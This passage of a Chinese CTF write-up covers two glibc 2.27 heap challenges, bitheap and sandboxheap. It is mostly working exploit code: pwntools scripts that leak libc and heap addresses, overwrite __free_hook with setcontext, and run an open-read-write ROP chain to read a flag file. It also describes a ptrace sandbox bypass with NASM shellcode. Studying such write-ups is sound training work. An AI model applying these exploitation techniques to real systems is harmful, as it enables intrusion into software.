class="line">challenge = <span class="string">&#x27;./bitheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;53178&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heapbase = <span class="literal">None</span></span><br><span class="line">libc_os = <span class="keyword">lambda</span> x : libc.address + x</span><br><span class="line">heap_os = <span class="keyword">lambda</span> x : heapbase + x</span><br><span class="line"></span><br><span class="line">p_sl = <span class="keyword">lambda</span> x, y : p.sendlineafter(y, <span class="built_in">str</span>(x) <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(x, <span class="built_in">bytes</span>) <span class="keyword">else</span> x)</span><br><span class="line">p_s  = <span class="keyword">lambda</span> x, y : p.sendafter(y, <span class="built_in">str</span>(x) <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(x, <span class="built_in">bytes</span>) <span class="keyword">else</span> x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,&quot;b* 0x407743\n&quot;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,&quot;b *$rebase()\nb *$rebase()&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">c</span>):</span></span><br><span class="line">    p_sl(c,<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p_sl(size,<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p_sl(content,<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr</span>):</span></span><br><span class="line">    con = <span class="built_in">bin</span>(addr).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> con[::-<span class="number">1</span>].ljust(<span class="number">64</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeb</span>(<span class="params">addr</span>):</span></span><br><span class="line">    con = <span class="built_in">bin</span>(addr).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> con[::-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0xb8</span>)</span><br><span class="line">show(<span class="number">0xf</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebd50</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x620</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">open_libc = libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">write_libc = libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">read_libc = libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc.address + <span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x0000000000001b96</span></span><br><span class="line">ret = libc.address + <span class="number">0x00000000000008aa</span></span><br><span class="line">syscall_ret = libc.address + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;free_hook: &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;setcontext: &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">payload = change(<span class="number">0x4000000</span>)*<span class="number">22</span> + change(<span class="number">0x170</span>)</span><br><span class="line">edit(<span class="number">11</span>,payload)</span><br><span class="line"></span><br><span class="line">heap_addr = heapbase + <span class="number">0x9d0</span></span><br><span class="line">payload = change(<span class="number">0</span>)+change(<span class="number">0x171</span>)+change(heap_addr+<span class="number">0x18</span>)+change(heap_addr+<span class="number">0x20</span>)+change(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xb8</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">rop_start = heapbase + <span class="number">0xed8</span></span><br><span class="line">payload = change(<span class="number">0</span>)+change(<span class="number">0xa0</span>)+change(free_hook)</span><br><span class="line">edit(<span class="number">0xa</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = change(setcontext)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xb8</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xb8</span>)</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">flag_addr = heapbase + <span class="number">0xe30</span></span><br><span class="line">payload = changeb(<span class="number">46</span>)+changeb(<span class="number">47</span>)+changeb(<span class="number">102</span>)+changeb(<span class="number">108</span>)+changeb(<span class="number">97</span>)+changeb(<span class="number">103</span>)+changeb(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += change(<span class="number">0</span>)*(<span class="number">20</span>-<span class="number">1</span>)</span><br><span class="line">payload += change(rop_start) + change(ret)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">2</span>) + change(pop_rdi_ret) + change(flag_addr) + change(pop_rsi_ret) + change(<span class="number">0</span>) + change(pop_rdx_ret) + change(<span class="number">0</span>) + change(syscall_ret)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">0</span>) + change(pop_rdi_ret) + change(<span class="number">3</span>) + change(pop_rsi_ret) + change(flag_addr) + change(pop_rdx_ret) + change(<span class="number">0x30</span>) + change(syscall_ret)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">1</span>) + change(pop_rdi_ret) + change(<span class="number">1</span>) + change(pop_rsi_ret) + change(flag_addr) + change(pop_rdx_ret) + change(<span class="number">0x30</span>) + change(syscall_ret)</span><br><span class="line">success(<span class="string">&quot;payload len: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>经过调试，有一个很明显的不同就是最后 free 的对象：</p>
<ul>
<li>修改前，释放了申请到 free_hook 的 chunk</li>
<li>修改后，释放了一个普通的 chunk（这样的话 ORW 链的起始地址和 ret_addr 就不用写在 free_hook 中，而是写在 heap 里）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0x7f4b34e148e8</span> (__free_hook) —▸ <span class="number">0x7f4b34a79085</span> (setcontext+<span class="number">53</span>) ◂— mov    rsp, qword ptr [rdi + <span class="number">0xa0</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*RDI  <span class="number">0x55bf7fe49e30</span> ◂— <span class="number">0x67616c662f2e</span> <span class="comment">/* &#x27;./flag&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>其实我习惯于释放 free_hook ，感觉这个应该问题不大（因为本地已经出 flag 了），另一种可能就是我的“描述信息”不完整：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./bitheap&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>以前没太注意，之后要写上了</li>
</ul>
<h2 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sandbox: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=c27ca36e8af1c678abff1e5ec09e7d2979285761, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>这题前面的过程都和 bitheap 一样，只是开了 ptrace 沙盒：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( LODWORD(regs.orig_rax) &lt;= <span class="number">0x2710</span> &amp;&amp; <span class="built_in">list</span>[SLODWORD(regs.orig_rax)] )</span><br><span class="line">&#123;</span><br><span class="line">    regs.orig_rax = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(PTRACE_SETREGS, fd, <span class="number">0</span>, &amp;regs) == <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">goto</span> print;</span><br><span class="line">    orig_rax = regs.orig_rax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当 if 语句条件满足时，ptrace 的 PTRACE_SETREGS 命令就会把 RAX 设置为“-1”</li>
<li>因此执行 syscall 时，RAX 不能为 <code>list[SLODWORD(regs.orig_rax)]</code> 中所指示的值：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">set</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">list</span>, <span class="number">1</span>, <span class="number">0x2711</span>uLL);</span><br><span class="line">    <span class="built_in">list</span>[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">    *(_DWORD *)&amp;<span class="built_in">list</span>[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list</span>[<span class="number">60</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">list</span>[<span class="number">231</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (a1 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">list</span>[<span class="number">40</span>] = <span class="number">0</span>;</span><br><span class="line">        *(_WORD *)<span class="built_in">list</span> = <span class="number">0</span>;</span><br><span class="line">        *(_DWORD *)&amp;<span class="built_in">list</span>[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">        *(_WORD *)&amp;<span class="built_in">list</span>[<span class="number">295</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">list</span>[<span class="number">10000</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (a1 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="built_in">list</span>[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>sys_execve-59</code> 不可能位于白名单中</li>
<li><code>sys_read-0</code> <code>sys_write-1</code> <code>sys_open-2</code> 可以同时处于白名单中（需要两个 if 同时成立）</li>
<li><code>sys_mprotect-10</code> 也在白名单中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x2710</span>LL:</span><br><span class="line">	<span class="built_in">set</span>(regs.rdi);</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>分析 ptrace 程序得知，在执行 syscall 前，令 <code>rax=0x2710 rdi=0x3</code> 就可以绕过沙盒</li>
</ul>
<p>于是我们需要对原来的 exp 进行修改，利用 <code>sys_mprotect</code> 使堆获取执行权限，然后再堆上执行 shellcode 来调整 <code>rax rdi</code>，然后执行 ORW 的过程</p>
<p>shellcode 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi,3</span><br><span class="line">xor rax,rax</span><br><span class="line">add rax,0x2710</span><br><span class="line">syscall</span><br><span class="line">mov rbx,rsp</span><br><span class="line">sub rbx,0x100</span><br><span class="line">mov rax,2</span><br><span class="line">mov rdi,rbx</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br><span class="line">mov rax,0</span><br><span class="line">mov rdi,3</span><br><span class="line">mov rsi,rbx</span><br><span class="line">mov rdx,0x30</span><br><span class="line">syscall</span><br><span class="line">mov rax,1</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rsi,rbx</span><br><span class="line">mov rdx,0x30</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">➜  sandboxheap nasm -f elf64 sh.s -o sh.o</span><br><span class="line">➜  sandboxheap ld sh.o -o sh      </span><br><span class="line">➜  sandboxheap objdump --disassemble ./sh</span><br><span class="line"></span><br><span class="line">./sh：     文件格式 elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000401000</span> &lt;_start&gt;:</span><br><span class="line">  <span class="number">401000</span>:	<span class="number">48</span> <span class="number">31</span> ff             	<span class="keyword">xor</span>    %rdi,%rdi</span><br><span class="line">  <span class="number">401003</span>:	bf <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x3</span>,%edi</span><br><span class="line">  <span class="number">401008</span>:	<span class="number">48</span> <span class="number">31</span> c0             	<span class="keyword">xor</span>    %rax,%rax</span><br><span class="line">  <span class="number">40100b</span>:	<span class="number">48</span> <span class="number">05</span> <span class="number">10</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2710</span>,%rax</span><br><span class="line">  <span class="number">401011</span>:	<span class="number">0f</span> <span class="number">05</span>                	syscall </span><br><span class="line">  <span class="number">401013</span>:	<span class="number">48</span> <span class="number">89</span> e3             	mov    %rsp,%rbx</span><br><span class="line">  <span class="number">401016</span>:	<span class="number">48</span> <span class="number">81</span> eb <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> 	sub    $<span class="number">0x100</span>,%rbx</span><br><span class="line">  <span class="number">40101</span>d:	b8 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x2</span>,%eax</span><br><span class="line">  <span class="number">401022</span>:	<span class="number">48</span> <span class="number">89</span> df             	mov    %rbx,%rdi</span><br><span class="line">  <span class="number">401025</span>:	<span class="number">48</span> <span class="number">31</span> f6             	<span class="keyword">xor</span>    %rsi,%rsi</span><br><span class="line">  <span class="number">401028</span>:	<span class="number">48</span> <span class="number">31</span> d2             	<span class="keyword">xor</span>    %rdx,%rdx</span><br><span class="line">  <span class="number">40102b</span>:	<span class="number">0f</span> <span class="number">05</span>                	syscall </span><br><span class="line">  <span class="number">40102</span>d:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">401032</span>:	bf <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x3</span>,%edi</span><br><span class="line">  <span class="number">401037</span>:	<span class="number">48</span> <span class="number">89</span> de             	mov    %rbx,%rsi</span><br><span class="line">  <span class="number">40103</span>a:	ba <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x30</span>,%edx</span><br><span class="line">  <span class="number">40103f</span>:	<span class="number">0f</span> <span class="number">05</span>                	syscall </span><br><span class="line">  <span class="number">401041</span>:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">401046</span>:	bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x1</span>,%edi</span><br><span class="line">  <span class="number">40104b</span>:	<span class="number">48</span> <span class="number">89</span> de             	mov    %rbx,%rsi</span><br><span class="line">  <span class="number">40104</span>e:	ba <span class="number">30</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x30</span>,%edx</span><br><span class="line">  <span class="number">401053</span>:	<span class="number">0f</span> <span class="number">05</span>                	syscall </span><br></pre></td></tr></table></figure>
<p>剩下的工作就有些繁琐，需要以题目规定的格式写入 shellcode</p>
<p>在执行 ORW 之前会先执行以下这段 syscall：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x56322a58cf40</span>    syscall  &lt;SYS_&lt;unk_10000&gt;&gt;</span><br><span class="line">       rdi: <span class="number">0x48000003</span></span><br><span class="line">       rsi: <span class="number">0x7000</span></span><br><span class="line">       rdx: <span class="number">0x7</span></span><br><span class="line">       r10: <span class="number">0x7f36f15c4bc0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— add    al, byte ptr [rax]</span><br></pre></td></tr></table></figure>
<ul>
<li>这个系统调用可以帮助我们获取 ORW 的白名单</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./sandboxheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span 